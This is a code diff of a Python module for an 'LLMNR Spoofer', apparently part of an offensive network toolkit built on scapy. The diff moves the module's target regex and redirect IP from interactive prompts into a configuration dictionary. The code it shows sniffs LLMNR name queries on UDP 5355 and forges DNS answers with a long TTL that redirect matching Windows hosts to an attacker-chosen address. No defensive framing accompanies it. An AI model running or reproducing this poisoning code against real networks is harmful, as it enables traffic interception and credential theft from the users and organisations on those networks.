@@ -1,44 +1,33 @@
 from scapy.all import *
 from poison import Poison
 from threading import Thread
-import re
 import util
 import config
 
 
 class llmnr(Poison):
-    """ Poisoner for LLMNR.  LLMNR is essentially
-        DNS + NBNS introduced in Windows Vista, and supercedes
-        NBNS for new versions of Windows.
-
-        More: http://en.wikipedia.org/wiki/LLMNR
-    """
     def __init__(self):
+        super(llmnr, self).__init__("LLMNR Spoofer")
         conf.verb = 0
         self.local = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
-        self.regex_match = None
-        self.redirect = None
-        super(llmnr, self).__init__("LLMNR Spoofer")
+        self.config.update({"regex_match":{"type":"regex", 
+                                           "value":None,
+                                           "required":True, 
+                                           "display":"Match request regex"},
+                            "redirect":{"type":"ip", 
+                                        "value":None,
+                                        "required":True, 
+                                        "display":"Redirect to"}
+                           })
+        self.info = """
+                    Poisoner for LLMNR.  LLMNR is essentially DNS + NBNS
+                    introduced in Windows Vista, and supercedes NBNS for
+                    new versions of Windows.
+
+                    More: http://en.wikipedia.org/wiki/LLMNR
+                    """
 
     def initialize(self):
-        while True:
-            try:
-                util.Msg('Using interface [%s:%s]'
-                                    % (config.get('iface'), self.local[1]))
-                tmp = raw_input('[+] Match request regex: ')
-                self.regex_match = re.compile(tmp)
-                self.redirect = raw_input("[+] Redirect match requests: ")
-                tmp = raw_input('[!] Match requests with \'%s\' and redirect to \'%s\'.  Is this correct?'\
-                                %(self.regex_match.pattern, self.redirect))
-
-                if 'n' in tmp.lower():
-                    return
-                break
-            except KeyboardInterrupt:
-                return None
-            except Exception:
-                pass
-
         util.Msg('Starting LLMNR spoofer...')
         sniffr = Thread(target=self.sniff_thread)
         sniffr.start()
@@ -49,7 +38,7 @@ class llmnr(Poison):
         """ Handle and parse requests """
         if pkt.haslayer(LLMNRQuery):
             request = pkt[LLMNRQuery][DNSQR].qname
-            ret = self.regex_match.search(request.lower())
+            ret = self.config['regex_match']['value'].search(request.lower())
             if ret is None:
                 return
 
@@ -77,7 +66,7 @@ class llmnr(Poison):
             packet.
         """
         return DNSRR(rrname=pkt[LLMNRQuery].qd.name, ttl=40000, rdlen=4,
-                rdata=self.redirect)
+                rdata=self.config['redirect']['value'])
 
     def sniff_thread(self):
         """ LLMNR is on UDP port 5355
@@ -94,4 +83,5 @@ class llmnr(Poison):
 
     def session_view(self):
         """ Override session view"""
-        return '%s -> %s' % (self.regex_match.pattern, self.redirect)
+        return '%s -> %s' % (self.config['regex_match']['value'].pattern,
+                 self.config['redirect']['value'])
